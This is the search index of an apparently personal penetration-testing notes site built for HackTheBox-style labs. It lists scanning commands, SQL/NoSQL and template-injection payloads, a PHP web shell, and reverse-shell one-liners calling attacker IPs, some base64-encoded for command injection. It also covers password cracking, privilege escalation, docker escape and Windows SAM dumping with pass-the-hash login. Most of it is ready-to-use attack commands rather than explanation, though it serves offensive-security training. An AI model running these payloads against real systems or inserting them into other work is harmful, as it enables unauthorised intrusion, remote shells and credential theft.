{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to MkDocs","text":"<p>For full documentation visit mkdocs.org.</p>"},{"location":"#commands","title":"Commands","text":"<ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>"},{"location":"#project-layout","title":"Project layout","text":"<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre>"},{"location":"old/old_README/","title":"SCANNING","text":""},{"location":"old/old_README/#ports-scanning","title":"PORTS SCANNING","text":""},{"location":"old/old_README/#nmap","title":"nmap:","text":"<ul> <li><code>nmap -sC -sV -script vuln 10.10.10.10</code></li> <li><code>nmap 1.1.1.1 -p-</code></li> <li><code>nmap 1.1.1.1 -p 80</code></li> <li> <p><code>nmap -sU 10.10.11.136</code></p> <ul> <li><code>-sC</code> for the default scripts</li> <li><code>-sV</code> for Version and OS Enumeration</li> <li><code>-sU</code> UDP port scan</li> <li><code>-script vuln</code> Check for vulnerabilities using the Nmap scripting engine</li> <li><code>-p-</code> Port scan all ports</li> <li><code>-p</code> Port scan for port x</li> </ul> </li> </ul>"},{"location":"old/old_README/#directories-scanning","title":"DIRECTORIES SCANNING","text":""},{"location":"old/old_README/#gobuster","title":"gobuster:","text":"<ul> <li> <p><code>gobuster -u 10.10.10.10/ -w /usr/share/seclists/Discovery/Web-Content/common.txt dir</code></p> <ul> <li><code>-s</code> Positive status codes (will be overwritten with status-codes-blacklist if set). Can also handle ranges like 200,300-400,404.</li> <li><code>-b</code> Negative status codes (will override status-codes if set). Can also handle ranges like 200,300-400,404. (default \"404\")</li> </ul> </li> </ul>"},{"location":"old/old_README/#feroxbuster","title":"feroxbuster:","text":"<ul> <li><code>feroxbuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/big.txt</code><ul> <li><code>-u</code> Host to scan</li> <li><code>-w</code> Wordlist </li> <li><code>-k</code> Ignore tls</li> </ul> </li> </ul>"},{"location":"old/old_README/#ffuf","title":"ffuf","text":"<ul> <li><code>ffuf -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://2million.htb/api/v1/FUZZ</code></li> </ul>"},{"location":"old/old_README/#subdomains-scanning","title":"SUBDOMAINS SCANNING","text":""},{"location":"old/old_README/#dns","title":"DNS:","text":""},{"location":"old/old_README/#wfuzz","title":"wfuzz:","text":"<ul> <li> <p><code>wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://app.microblog.htb/' -H 'Host: FUZZ.microblog.htb' --hw 11</code></p> <ul> <li><code>-hw</code> Ignore the domains that return this number of words</li> </ul> </li> </ul>"},{"location":"old/old_README/#reverse-dns","title":"REVERSE DNS:","text":""},{"location":"old/old_README/#dig","title":"dig:","text":"<ul> <li><code>dig @10.10.11.166 -x 10.10.11.166</code></li> <li><code>dig axfr friendzone.red @10.10.10.123</code></li> </ul>"},{"location":"old/old_README/#smb","title":"SMB:","text":""},{"location":"old/old_README/#smbmap","title":"smbmap:","text":"<ul> <li><code>smbmap -H 10.10.10.123</code></li> </ul>"},{"location":"old/old_README/#smbclient","title":"smbclient:","text":"<ul> <li><code>smbclient --no-pass //10.10.10.123/general</code></li> <li><code>get creds.txt</code></li> <li><code>put</code></li> </ul>"},{"location":"old/old_README/#snmp","title":"SNMP:","text":"<ul> <li><code>snmpwalk -v 1 -c public 10.10.11.136</code></li> </ul>"},{"location":"old/old_README/#injections","title":"INJECTIONS","text":""},{"location":"old/old_README/#tools","title":"Tools:","text":""},{"location":"old/old_README/#burpsuit","title":"BURPSUIT:","text":"<ul> <li><code>\"Send the payloads with repeater/intruder\"</code></li> </ul>"},{"location":"old/old_README/#nikto","title":"NIKTO:","text":"<ul> <li><code>nikto -h 10.10.11.111 -O STATIC-COOKIE=\"name=value\"</code><ul> <li><code>-h</code> Host to scan</li> </ul> </li> </ul>"},{"location":"old/old_README/#owasp-zap","title":"OWASP ZAP","text":"<ul> <li><code>owasp zap</code></li> </ul>"},{"location":"old/old_README/#sql-injectionsqli","title":"SQL INJECTION(SQLi)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> </ul> <p>We want to find credentials exploring possible DBs and tables. Another way is to read files.</p>"},{"location":"old/old_README/#sqlmap","title":"sqlmap:","text":"<ul> <li><code>sqlmap -r request.req --dbs</code></li> <li><code>sqlmap -r request.req -D main --tables</code></li> <li><code>sqlmap -r request.req -D main -T user --columns</code></li> <li><code>sqlmap -r request.req -D main -T user --dump</code></li> <li><code>sqlmap -r req.req --level=5 --risk=3 --batch --file-read=/var/www/html/index.php&gt;</code></li> <li><code>sqlmap -r req.req --level=5 --risk=3 --batch --file-write=/home/kali/Downloads/Exploit/webshell.php --file-dest=/var/www/html/webshell.php</code></li> <li> <p><code>sqlmap -u \"ws://soc-player.soccer.htb:9091\" --data '{\"id\": \"*\"}' --threads 10 --level 5 --risk 3 --batch -D soccer_db -T accounts --dump</code></p> <ul> <li><code>--dbs</code> Enumerate databases</li> <li><code>--tables</code> Enumerate DB tables</li> <li><code>--columns</code> Enumerate columns</li> <li><code>--dump</code> Get table values</li> <li><code>--level</code> (max 5)</li> <li><code>--risk</code> (max 3)</li> <li><code>--batch</code> Ask no questions</li> <li><code>--file-read</code> Path to file that we want to read from server</li> <li><code>--file-write</code> Path to file that we want to upload to server</li> <li> <p><code>--file-dest</code> Path to location that we want to put the uploaded file</p> </li> <li> <p><code>-r</code> Request file</p> </li> <li><code>-D</code> Select DB</li> <li><code>-T</code> Select Table</li> </ul> </li> </ul>"},{"location":"old/old_README/#manual","title":"manual:","text":"<ul> <li><code>admin' union select 1;-- -</code></li> <li>FIND ALL DBS:   <code>admin' UNION SELECT group_concat(schema_name) FROM information_schema.schemata;-- -</code></li> <li>FIND TABLES IN DB:   <code>admin' UNION SELECT group_concat(table_name) FROM information_schema.tables where table_schema='november';-- -</code></li> <li>FIND COLUMNS IN TABLE:   <code>admin' UNION SELECT group_concat(table_name, ':', column_name) FROM INFORMATION_SCHEMA.columns WHERE table_schema='november';-- -</code></li> <li>FIND VALUES:   <code>admin' UNION SELECT group_concat(one) FROM flag;-- -</code></li> <li>READ FILES:   <code>admin' UNION SELECT load_file('/var/www/html/index.php');-- -</code></li> </ul>"},{"location":"old/old_README/#manual-time-based","title":"manual time based:","text":"<ul> <li>FIND DB NUMBER OF CHARACTERS:</li> <li><code>1%20OR%20IF(LENGTH((SELECT%20database()))=5,SLEEP(1),0)%23</code></li> </ul>"},{"location":"old/old_README/#nosql-injectionnosqli","title":"NOSQL INJECTION(NOSQLI)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> </ul>"},{"location":"old/old_README/#manual_1","title":"manual:","text":"<pre><code>\"change content type to application/json\"\n{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}\n</code></pre> <ul> <li><code>admin' || '' === '</code> Bypass login page with admin as user`</li> <li><code>';return 'a'=='a' &amp;&amp; ''==' -</code> Extract all data</li> </ul>"},{"location":"old/old_README/#server-side-template-injectionssti","title":"Server Side Template Injection(SSTI)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> <li>PayLoads 2</li> <li>YouTube</li> </ul>"},{"location":"old/old_README/#payloads","title":"Payloads:","text":"<ul> <li><code>${{&lt;%[%'\"}}%\\.</code></li> <li><code>{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}</code></li> <li><code>{{range.constructor(\\\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\\\")()}}</code> nodeJS</li> </ul>"},{"location":"old/old_README/#command-injection","title":"COMMAND INJECTION","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> <li><code>echo${IFS}\"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi85OTk5IDA+JjEK\" | base64${IFS} -d | bash</code> Send the payload</li> </ul>"},{"location":"old/old_README/#local-file-inclusionlfi","title":"LOCAL FILE INCLUSION(LFI)","text":"<ul> <li>HackTricks</li> <li> <p>Payloads</p> </li> <li> </li> </ul>"},{"location":"old/old_README/#lfi-to-rce","title":"LFI TO RCE:","text":"<ul> <li><code>https://github.com/synacktiv/php_filter_chain_generator</code></li> </ul>"},{"location":"old/old_README/#methods","title":"METHODS:","text":"<ul> <li><code>file:///etc/passwd</code></li> <li>Common Files</li> </ul> <pre><code>\"View source code and change image directory\"\n`curl -k 'https://broscience.htb/includes/img.php?path=../../../../../../etc/passwd'`\n</code></pre>"},{"location":"old/old_README/#server-side-request-forgeryssrf","title":"Server Side Request Forgery(SSRF)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> <li>YouTube</li> </ul>"},{"location":"old/old_README/#methods_1","title":"METHODS:","text":"<pre><code>echo 'HTTP/1.1 301 Moved Permanently' &gt;&gt; response\necho 'Location: http://forge.htb/' &gt;&gt; response\necho '' &gt;&gt; response\necho '' &gt;&gt; response\nnc -lvnp 8000 &lt; response\n</code></pre>"},{"location":"old/old_README/#cross-site-request-forgerycsrf","title":"Cross-Site Request Forgery(CSRF)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> <li>YouTube</li> </ul>"},{"location":"old/old_README/#cross-site-scriptingxss","title":"Cross Site Scripting(XSS)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> <li>YouTube</li> </ul>"},{"location":"old/old_README/#dom","title":"DOM","text":"<p>his is a type of XSS attack where the vulnerability exists in the client-side code rather than the server-side code. The malicious script is embedded in the HTML page and is executed by the victim's browser when the page is loaded. This makes it more difficult to detect and prevent, as it does not involve the server at all. One good example is search bar.</p>"},{"location":"old/old_README/#reflected","title":"REFLECTED","text":"<p>In this type of attack, the malicious script is part of the victim's request to the website. The website includes this script in its response, which is then executed by the victim's web browser. This is often used in phishing attacks where the attacker creates a fakelogin page and sends the URL to the victim. When the victim enters their credentials, the data is sent to the attacker. Another is to find some URL where it looks like ?q=something.</p>"},{"location":"old/old_README/#storedpersisted","title":"STORED/PERSISTED","text":"<p>In this type of attack, the malicious script is injected into a website's database. This script is then served to the website's users when they request it, leading to the execution of the script in their web browsers. An example of a stored XSS attack is when an attacker injects a comment containing malicious code on a website, and that code is served to other users who view the comment.</p> <ul> <li><code>&lt;iframe src=\\\"javascript:alert('xss')\\\"&gt;</code></li> <li><code>&lt;iframe src=\"javascript:alert('xss')\"&gt;</code></li> <li><code>&lt;iframe src='javascript:alert('xss')'&gt;</code></li> <li><code>&lt;script&gt;document.write('&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;');&lt;/script&gt;</code></li> </ul>"},{"location":"old/old_README/#blind","title":"BLIND","text":"<ul> <li><code>';\"&lt;/textarea&gt;&lt;/script&gt;&lt;script/src=/bxss.hackwithnahamsec.com/</code> XSS Hunter</li> <li><code>&lt;/textarea&gt;&lt;/script&gt;&lt;script&gt;alert(\"This is a basic alert\");&lt;/script&gt;</code></li> </ul>"},{"location":"old/old_README/#xml-external-entityxee","title":"XML External Entity(XEE)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> </ul>"},{"location":"old/old_README/#directory-traversal","title":"Directory Traversal","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> </ul>"},{"location":"old/old_README/#file-uplaod","title":"FILE UPLAOD","text":""},{"location":"old/old_README/#bypasses","title":"BYPASSES:","text":"<ul> <li><code>Instead of .php, we can use .phar and use ?page=phar://uploads</code></li> </ul>"},{"location":"old/old_README/#http-parameter-pollution-hpp","title":"HTTP Parameter Pollution (HPP)","text":"<p>HTTP Parameter Pollution (HPP) is a Web attack evasion technique that allows an attacker to craft a HTTP request in order to manipulate web logics or retrieve hidden information. This evasion technique is based on splitting an attack vector between multiple instances of a parameter with the same name (?param1=value&amp;param1=value). As there is no formal way of parsing HTTP parameters, individual web technologies have their own unique way of parsing and reading URL parameters with the same name. Some taking the first occurrence, some taking the last occurrence, and some reading it as an array. This behavior is abused by the attacker in order to bypass pattern-based security mechanisms. </p>"},{"location":"old/old_README/#shell","title":"SHELL","text":""},{"location":"old/old_README/#reverse-shell","title":"REVERSE SHELL","text":""},{"location":"old/old_README/#open","title":"OPEN:","text":"<ul> <li>Generator</li> <li><code>sh -i &gt;&amp; /dev/tcp/10.10.14.6/9999 0&gt;&amp;1</code></li> <li> <p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.12 4444 &gt;/tmp/f</code> Use in files</p> </li> <li> <p><code>python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'</code> Python </p> </li> <li> <p><code>If we can execute commands on the target, we can try to create MSFVenom payload and execute it inside target</code></p> </li> </ul>"},{"location":"old/old_README/#send","title":"SEND:","text":"<ul> <li><code>echo 'sh -i &gt;&amp; /dev/tcp/10.10.14.6/9999 0&gt;&amp;1' | base64</code> - Convert reverse shell to base64</li> <li><code>bash -c(\"sh -i &gt;&amp; /dev/tcp/10.10.14.12/4444 0&gt;&amp;1\")</code> - Execute the reverse shell</li> <li><code>echo${IFS}\"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjIvOTk5OSAwPiYxCg==\" | base64${IFS} -d | bash</code> - Send the payload</li> </ul>"},{"location":"old/old_README/#web-shell","title":"WEB SHELL","text":""},{"location":"old/old_README/#open_1","title":"OPEN:","text":"<ul> <li><code>&lt;?php SYSTEM($_REQUEST['cmd']); ?&gt;</code></li> </ul>"},{"location":"old/old_README/#send_1","title":"SEND:","text":"<ul> <li><code>curl 10.10.11.116/shell.php --data-urlencode 'cmd=bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.60/443 0&gt;&amp;1\"'</code></li> <li><code>bash -c 'sh -i &gt;%26 /dev/tcp/10.10.14.12/9999 0&gt;%261'</code></li> </ul>"},{"location":"old/old_README/#listening-shell","title":"LISTENING SHELL:","text":"<ul> <li><code>nc -lnvp 9999</code></li> </ul>"},{"location":"old/old_README/#upgrade-shell","title":"UPGRADE SHELL:","text":""},{"location":"old/old_README/#stabilize","title":"STABILIZE:","text":"<pre><code>python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n\"CTRL+Z\"\nstty raw -echo; fg\nexport TERM=xterm\n</code></pre>"},{"location":"old/old_README/#proper-shell","title":"PROPER SHELL:","text":""},{"location":"old/old_README/#victim","title":"Victim","text":"<pre><code>ssh-keygen\ncd ./ssh\ncat id_rsa.pub &gt; authorized_keys\nchmod 700 ~/\nchmod 700 ~/.ssh\nchmod 600 ~/.ssh/authorized_key\n</code></pre>"},{"location":"old/old_README/#host","title":"Host","text":"<ul> <li><code>nano id_rsa</code></li> <li>(Copy from id_rsa victim)</li> <li><code>chmod 400 id_rsa</code></li> <li><code>ssh -i id_rsa matt@10.10.11.136</code></li> </ul>"},{"location":"old/old_README/#passphrase","title":"PASSPHRASE:","text":"<pre><code>python3 /usr/share/john/ssh2john.py id_rsa &gt; hash.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n</code></pre> <p><code>john --show hash.txt</code></p>"},{"location":"old/old_README/#ports","title":"PORTS","text":""},{"location":"old/old_README/#open-server","title":"OPEN SERVER:","text":""},{"location":"old/old_README/#python","title":"PYTHON:","text":"<ul> <li><code>python3 -m http.server</code></li> </ul>"},{"location":"old/old_README/#port-forwarding","title":"PORT FORWARDING:","text":""},{"location":"old/old_README/#ssh-tunnel","title":"SSH TUNNEL:","text":""},{"location":"old/old_README/#remote-machine","title":"Remote machine:","text":"<ul> <li><code>ssh -N -f -R 3000:localhost:3000 -R 8001:localhost:8001 kali@10.10.14.119 -p 2222</code></li> </ul>"},{"location":"old/old_README/#local-machine","title":"Local machine:","text":"<pre><code>sudo nano /etc/ssh/sshd_config\n#port 22 to port 2222\nsudo service ssh start\n</code></pre> <pre><code>9001 on my local machine now forwards to remote machine port 80\nssh -L 9001:localhost:80 daniel@10.10.11.136\n</code></pre> <pre><code>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\nssh -L 9001:10.10.11.136:80 daniel@10.10.11.136\n</code></pre>"},{"location":"old/old_README/#chisel","title":"CHISEL:","text":""},{"location":"old/old_README/#remote-machine_1","title":"Remote machine:","text":"<pre><code>./chisel client --fingerprint AsdlkipAKiomLjygJpoukjnO 10.10.10.10:8080 R:8000:10.10.10.10:8000 \n</code></pre>"},{"location":"old/old_README/#local-machine_1","title":"Local machine:","text":"<pre><code>8000 on my local machine now forwards to remote machine port 8000\nchisel server --socks5 --reverse  \n</code></pre>"},{"location":"old/old_README/#brute-forcing","title":"BRUTE FORCING","text":""},{"location":"old/old_README/#hash-identifier","title":"HASH IDENTIFIER:","text":""},{"location":"old/old_README/#format","title":"FORMAT:","text":"<ul> <li><code>hash-identifier</code></li> </ul>"},{"location":"old/old_README/#crack","title":"CRACK:","text":"<ul> <li><code>John The Ripper</code></li> <li><code>john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></li> <li><code>zip2john 16162020_backup.zip &gt; 16162020_backup.zip.john</code> Transforms zip file protected with password to john format</li> </ul>"},{"location":"old/old_README/#login","title":"LOGIN","text":""},{"location":"old/old_README/#hydra","title":"hydra:","text":"<ul> <li><code>hydra -l user -P passlist.txt ftp://192.168.0.1</code></li> <li><code>hydra -L users.txt -p password123 ftp://192.168.0.1</code></li> <li><code>-l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE</code></li> <li><code>-p PASS  or -P FILE  try password PASS, or load several passwords from FILE</code></li> </ul>"},{"location":"old/old_README/#passwords-managers","title":"PASSWORDS MANAGERS","text":""},{"location":"old/old_README/#passpie","title":"Passpie:","text":"<ul> <li><code>passpie export password.db</code> Exports passwords to plain text</li> <li>\"download .keys to local machine\"</li> <li>\"remove the public key block from the file as we only need the private key\"</li> <li><code>gpg2john keys &gt; keys.hash</code></li> <li><code>john -wordlist=/usr/share/wordlists/rockyou.txt keys.hash --format=gpg</code></li> <li><code>passpie export ~/password.db</code></li> <li><code>cat ~/password.db</code></li> </ul>"},{"location":"old/old_README/#wordpress","title":"WORDPRESS","text":"<ul> <li>\"search for wp-config.php\"</li> </ul>"},{"location":"old/old_README/#protocols","title":"PROTOCOLS","text":""},{"location":"old/old_README/#ssh","title":"SSH","text":""},{"location":"old/old_README/#connection","title":"CONNECTION:","text":"<ul> <li><code>ssh john@10.10.10.10 -p 22</code></li> </ul>"},{"location":"old/old_README/#download-files-on-local-machine","title":"DOWNLOAD FILES: (on local machine)","text":"<ul> <li><code>scp jnelson@10.10.11.186:/home/jnelson/.passpie/.keys ./keys</code></li> </ul>"},{"location":"old/old_README/#upload-files-on-local-machine","title":"UPLOAD FILES: (on local machine)","text":"<ul> <li><code>scp chisel machine@10.10.10.10:/tmp</code></li> </ul>"},{"location":"old/old_README/#ftp","title":"FTP","text":""},{"location":"old/old_README/#connection_1","title":"CONNECTION:","text":"<ul> <li><code>ftp 10.10.11.186</code></li> </ul>"},{"location":"old/old_README/#download-files","title":"DOWNLOAD FILES:","text":"<ul> <li><code>get file.txt</code></li> </ul>"},{"location":"old/old_README/#databases","title":"DATABASES","text":""},{"location":"old/old_README/#postgres","title":"POSTGRES","text":"<ul> <li><code>psql -h 127.0.0.1 -U postgres</code> - Connect DB</li> <li><code>\\l</code> - List all databases</li> <li><code>\\c \u201cdb\u201d;</code> - Select DB</li> <li><code>\\dt;</code> - List all tables</li> <li><code>Select * from users;</code> - Dump table data</li> </ul>"},{"location":"old/old_README/#root-shell","title":"ROOT SHELL","text":"<ul> <li>Exploit any identified vulnerabilities or misconfigurations to gain remote access to the target system.</li> <li>Use tools like Metasploit or manual exploitation techniques.</li> <li>Maintain access and establish persistence on the compromised system.</li> </ul>"},{"location":"old/old_README/#linux","title":"LINUX:","text":""},{"location":"old/old_README/#common-files-to-testretrive","title":"Common Files to test/retrive:","text":"<ul> <li><code>/etc/passwd</code></li> <li><code>/wp-config.php</code> Wordpress config</li> <li><code>/etc/passwd</code> Users </li> <li><code>/var/www/</code> Folder that contains website code</li> <li><code>/etc/nginx/sites-available/</code> Folder that contains nginx configs</li> <li><code>/etc/nginx/sites-available/default</code> nginx Vhosts</li> <li><code>/etc/apache2/sites-enabled/</code> Folder that contains apache2 configs</li> <li><code>/etc/apache2/sites-enabled/000-default.conf</code> apache2 Vhosts</li> </ul>"},{"location":"old/old_README/#lateral-movement","title":"LATERAL MOVEMENT","text":"<p>We will try to gain shell as another user. We can check home directory and /etc/passwd to check how many users exists.</p>"},{"location":"old/old_README/#port-forward","title":"PORT FORWARD","text":"<pre><code>cat /etc/apache2/sites-enabled/\n\"port forward\"\n</code></pre> <pre><code>ss -tlpn\n\"port forward\"\n</code></pre> <pre><code>\"Find abnormal files like database configs, .git, passwords managers, ...\"\n\"One good place to find, /var/www/\"\n</code></pre>"},{"location":"old/old_README/#privilege-escalation","title":"PRIVILEGE ESCALATION","text":""},{"location":"old/old_README/#gtfo-bins","title":"GTFO BINS","text":""},{"location":"old/old_README/#sudo","title":"SUDO:","text":"<ul> <li><code>sudo -l</code></li> </ul>"},{"location":"old/old_README/#suid","title":"SUID:","text":"<ul> <li><code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code></li> <li><code>find / -perm -4000 2&gt;/dev/null</code></li> <li><code>find / -group staff 2&gt;/dev/null</code></li> <li><code>find / -type f -user svc_acc 2&gt;/dev/null</code></li> </ul>"},{"location":"old/old_README/#capabilities","title":"CAPABILITIES:","text":"<ul> <li> <p><code>getcap -r / 2&gt;/dev/null</code></p> </li> <li> </li> <li><code>https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation#method-2</code></li> </ul>"},{"location":"old/old_README/#lxclxd","title":"LXC/LXD","text":""},{"location":"old/old_README/#path","title":"PATH:","text":"<ul> <li><code>ltrace pandora_backup</code></li> <li><code>which tar</code></li> <li><code>echo $PATH</code></li> <li><code>export PATH=/tmp:$PATH</code></li> </ul>"},{"location":"old/old_README/#kernel-exploits","title":"Kernel Exploits:","text":"<ul> <li><code>sudo -V</code></li> </ul>"},{"location":"old/old_README/#docker-escape","title":"DOCKER ESCAPE","text":""},{"location":"old/old_README/#method1-directory-from-the-host-is-mounted-with-readwrite-flag-enabled","title":"METHOD1: Directory from the host is mounted with read/write flag enabled","text":"<ul> <li>Find Host IP:</li> <li> <p><code>ifconfig</code></p> </li> <li> <p>Enumerate Ports:</p> </li> <li> <p><code>for PORT in {0..1000}; do timeout 1 bash -c \"&lt;/dev/tcp/172.19.0.1/$PORT &amp;&gt;/dev/null\" 2&gt;/dev/null &amp;&amp; echo \"port $PORT is open\"; done</code></p> </li> <li> <p>SSH:   <code>ssh augustus@172.19.0.1`   cp /bin/bash .   exit</code></p> </li> <li> <p>Docker Container:   <code>chown root:root bash`   chmod 4755 bash`   ./bash -p`</code></p> </li> </ul>"},{"location":"old/old_README/#windows","title":"WINDOWS","text":"<pre><code>reg save hklm\\system system.bak\nreg save hklm\\sam sam.bak\ndownload system.bak\ndownload sam.bak\npython3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL\nevil-winrm -i 10.10.136.177 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3\n</code></pre>"},{"location":"old/old_README/#hacking","title":"HACKING","text":""},{"location":"old/old_README/#information-gathering","title":"Information Gathering","text":"<ul> <li>Gather information about the target organization, including email addresses, employee names, and public information.</li> <li>Use OSINT (Open-Source Intelligence) techniques to find additional attack vectors or social engineering opportunities.</li> </ul>"},{"location":"old/old_README/#enumeration","title":"Enumeration","text":""},{"location":"old/old_README/#ports-scanning_1","title":"Ports Scanning","text":"<ul> <li>Use tools like Nmap to scan for open ports and services.</li> <li>Search for exploit/CVE information related to the identified services and versions.</li> <li>Enumerate services and versions using tools like banner grabbing or service-specific enumeration scripts.</li> <li>Identify weak or default credentials for services such as SSH or FTP.</li> </ul>"},{"location":"old/old_README/#dns_1","title":"DNS","text":"<ul> <li>If a DNS port is detected (e.g., port 53):</li> <li>Reverse DNS to discover hidden domains.</li> </ul>"},{"location":"old/old_README/#smb_1","title":"SMB","text":"<ul> <li>If a SMB port is detected (e.g., port 139, 445):</li> <li>SMB to find open shares.</li> </ul>"},{"location":"old/old_README/#web-application-scanning","title":"Web Application Scanning","text":"<ul> <li>If a website is detected (e.g., port 80, 443):</li> <li>Use tools like Nikto and OWASP Zap to scan for potential web application vulnerabilities.</li> <li>Conduct Directories Scanning to discover hidden or sensitive directories.</li> <li>Perform Subdomains Scanning using tools like wfuzz.</li> </ul>"},{"location":"old/old_README/#gaining-access","title":"Gaining Access","text":""},{"location":"old/old_README/#burpsuite","title":"BURPSUITE","text":"<ul> <li>Explore the web application:</li> <li>Navigate through the application, interact with forms, and explore its functionality to understand its behavior.</li> <li>View source code:</li> <li>Inspect the HTML source code of web pages for hidden elements, comments, and potential vulnerabilities.</li> <li>Find hidden elements:</li> <li>Check for hidden input fields, parameters, or functionality that might be accessible but not visible in the user interface.</li> <li>Identify functions:</li> <li>Look for JavaScript functions or server-side functions that could be vulnerable to exploitation.</li> <li>Discover versions and frameworks:</li> <li>Identify the web application's versions and underlying frameworks to search for known vulnerabilities.</li> <li>Analyze headers:</li> <li>Examine HTTP response headers for security-related information, such as security headers or server information.</li> <li>Inspect cookies:</li> <li> <p>Check for cookies used by the application, especially those related to authentication and sessions.</p> </li> <li> <p>If a .git directory is found:</p> </li> <li>Explore the .git directory for sensitive information or source code, which might have been inadvertently exposed.</li> <li> <p>Using git-dumper can retrive us the source code.</p> </li> <li> <p>If web forms are present:</p> </li> <li> <p>Proceed with Injections.</p> </li> <li> <p>After searching for an entry point, if there's potential for a reverse shell or protocol exploitation, proceed with Root Shell.</p> </li> </ul>"},{"location":"old/Phases/1-Enumeration/InformationGathering/","title":"Active Infrastructure Enumeration","text":""},{"location":"old/Phases/1-Enumeration/InformationGathering/#http-headers","title":"HTTP Headers","text":"<ul> <li><code>curl -I \"http://${TARGET}\"</code></li> </ul> <pre><code>HTTP/1.1 200 OK\nDate: Fri, 08 Mar 2024 14:49:34 GMT\nServer: Apache/2.4.41 (Ubuntu)\nSet-Cookie: 02a93f6429c54209e06c64b77be2180d=jucujsfvo14loqests15drfl34; path=/; HttpOnly\nExpires: Wed, 17 Aug 2005 00:00:00 GMT\nLast-Modified: Fri, 08 Mar 2024 14:49:44 GMT\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nPragma: no-cache\nVary: Accept-Encoding\nTransfer-Encoding: chunked\nContent-Type: text/html; charset=utf-8\n</code></pre> <pre><code>There are also other characteristics to take into account while fingerprinting web servers in the response headers. These are:\n\n    X-Powered-By header: This header can tell us what the web app is using. We can see values like PHP, ASP.NET, JSP, etc.\n\n    Cookies: Cookies are another attractive value to look at as each technology by default has its cookies. Some of the default cookie values are:\n        .NET: ASPSESSIONID&lt;RANDOM&gt;=&lt;COOKIE_VALUE&gt;\n        PHP: PHPSESSID=&lt;COOKIE_VALUE&gt;\n        JAVA: JSESSION=&lt;COOKIE_VALUE&gt;\n</code></pre>"},{"location":"old/Phases/1-Enumeration/InformationGathering/#whatweb","title":"WhatWeb","text":"<ul> <li><code>whatweb -a3 https://www.facebook.com -v</code></li> </ul>"},{"location":"old/Phases/1-Enumeration/InformationGathering/#active-subdomain-enumeration","title":"Active Subdomain Enumeration","text":""},{"location":"old/Phases/1-Enumeration/InformationGathering/#1-identifying-nameservers","title":"1. Identifying Nameservers","text":"<ul> <li><code>nslookup -type=NS zonetransfer.me</code></li> </ul>"},{"location":"old/Phases/1-Enumeration/InformationGathering/#2-testing-for-any-and-axfr-zone-transfer","title":"2. Testing for ANY and AXFR Zone Transfer","text":"<ul> <li><code>nslookup -type=any -query=AXFR zonetransfer.me nsztm1.digi.ninja</code></li> </ul>"},{"location":"old/Phases/1-Enumeration/Nmap/","title":"Nmap:","text":"<ul> <li><code>nmap -sC -sV -script vuln 10.10.10.10</code></li> <li><code>nmap 10.10.10.10 -p-</code></li> <li><code>nmap 10.10.10.10 -p 80</code></li> <li><code>nmap -sU 10.10.10.10</code></li> </ul> <pre><code>nmap -T4 -p- -v 10.10.10.10\nnmap -T4 -p 80,443,743-749 -A -sCV -v 10.10.10.10\n</code></pre> <pre><code>- `-sC` for the default scripts\n- `-sV` for Version and OS Enumeration\n- `-sU` UDP port scan\n- `-script vuln` Check for vulnerabilities using the Nmap scripting engine\n- `-p-` Port scan all ports\n- `-p` Port scan for port x\n- `-v` Increase the verbosity level (use -vv or more for greater effect)\n</code></pre> Scanning Options Description 10.129.2.28 Scans the specified target. -p- Scans all ports. -sV Performs service version detection on specified ports. -A Performs service detection, OS detection, traceroute, and uses default scripts to scan the target. -Pn Disables ICMP Echo requests. -sU Performs a UDP scan. -p 137 Scans only the specified port. -n Disables DNS resolution. -O Performs operating system detection scan. -S Scans the target using different source IP addresses. --disable-arp-ping Disables ARP ping. --packet-trace Shows all packets sent and received. -oA target Saves the results in all formats, starting the name of each file with 'target'. -F Scans top 100 ports. --reason Displays the reason a port is in a particular state. -PE Performs the ping scan by using 'ICMP Echo requests' against the target. --script banner,smtp-commands Uses specified NSE scripts. --initial-rtt-timeout 50ms Sets the specified time value as initial RTT timeout. --max-rtt-timeout 100ms Sets the specified time value as maximum RTT timeout. --max-retries 0 Sets the number of retries that will be performed during the scan. --min-rate 300 Sets the minimum number of packets to be sent per second. -T 5 Specifies the insane timing template. ## Host 